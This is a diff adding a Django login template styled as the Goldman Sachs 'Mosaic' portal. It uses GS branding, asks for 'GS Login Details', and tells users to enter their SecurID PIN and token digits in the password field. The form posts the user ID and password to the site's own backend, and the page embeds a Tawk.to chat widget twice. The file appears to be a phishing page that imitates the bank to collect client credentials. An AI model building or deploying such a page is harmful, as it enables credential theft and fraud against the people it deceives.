@@ -1,0 +1,176 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Login - GS Mosaic Style</title>
+    <link rel="icon" type="image/svg+xml" href="{% static 'assets/img/logos/gs-favicon.svg' %}">
+       <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="alternate icon" href="{% static 'assets/img/logos/gs-favicon.ico' %}">
+    <link rel="mask-icon" href="{% static 'assets/img/logos/gs-favicon.ico' %}">
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/logos/gs-favicon-180.png' %}">
+    <link href="{% static 'assets/css/style.css' %}" rel="stylesheet">
+
+    <style>
+              #loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+    </style>
+
+
+    
+</head>
+<body>
+<div class="main">
+    <div class="header">
+        <div class="logo"></div>
+    </div>
+    <div class="container">
+        <div class="welcome-section">
+            <div>
+                <h1>Welcome to Mosaic.</h1>
+                <span>Introducing a new way to fulfill your trading, research and analytics needs.</span>
+            </div>
+        </div>
+        <div class="login-card">
+            <div>
+                <div class="login-message"></div>
+                <div class="login-card-title"> Enter your GS Login Details</div>
+                <form id="login-form" class="login-form" method="post" action="{% url 'login' %}">
+                     {% csrf_token %}
+                    <div class="input-container">
+                        <input  placeholder="User ID" name="identifier" required type="text">
+                        <div class="pwcontainer">
+                            <input name="password"  placeholder="Password" required type="password">
+                            <div class="eye"></div>
+                        </div>
+                    </div>
+                    <div class="checkbox-container">
+                        <input id="checkbox1" type="checkbox">
+                        <label class="login-checkbox-label" for="checkbox1">Remember my username</label>
+                    </div>
+                    <button  id="login" name="login" type="submit">LOG IN</button>
+                    <div class="forget-password-container d-none">
+                        <div>Forget Password</div>
+                        <div>Need Help</div>
+                    </div>
+                    <div class="notice">
+                        <p class="p1">If you have a SecurID card, please enter your SecurID password or PIN in the password field, followed by the 6 digits showing on the front of your SecurID card</p>
+                        <a class="p2" href="https://www.goldmansachs.com/investor-relations/financials" target="_blank"> Statement of Financial Conditions</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <!-- Loader Spinner -->
+    <div id="loader">
+        <div class="spinner-border text-light" role="status">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+    </div>
+
+<script src="{% static 'assets/js/script.js' %}"></script>
+<script src="{% static 'assets/js/jquery.js' %}"></script>
+<script src="{% static 'assets/js/general.js' %}"></script>
+
+
+    <!-- SweetAlert2 and Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Show loader
+            const loader = document.getElementById('loader');
+            loader.style.display = 'flex';
+
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this),
+                headers: {
+                    'X-CSRFToken': '{{ csrf_token }}'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Hide loader
+                loader.style.display = 'none';
+
+                if (data.status === 'success') {
+                    Swal.fire({
+                        title: 'Success!',
+                        text: data.message,
+                        icon: 'success',
+                        confirmButtonText: 'OK'
+                    }).then((result) => {
+                        if (result.isConfirmed) {
+                            window.location.href = '/'; // Redirect to home page after login
+                        }
+                    });
+                } else {
+                    Swal.fire({
+                        title: 'Error!',
+                        text: data.message,
+                        icon: 'error',
+                        confirmButtonText: 'OK'
+                    });
+                }
+            })
+            .catch(error => {
+                // Hide loader on error
+                loader.style.display = 'none';
+                Swal.fire({
+                    title: 'Error!',
+                    text: 'An unexpected error occurred. Please try again.',
+                    icon: 'error',
+                    confirmButtonText: 'OK'
+                });
+            });
+        });
+    </script>
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/688ce678cfc5fc192486f57f/1j1j68ib8';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+
+    <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/688ce678cfc5fc192486f57f/1j1j68ib8';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+
+</body>
+</html>
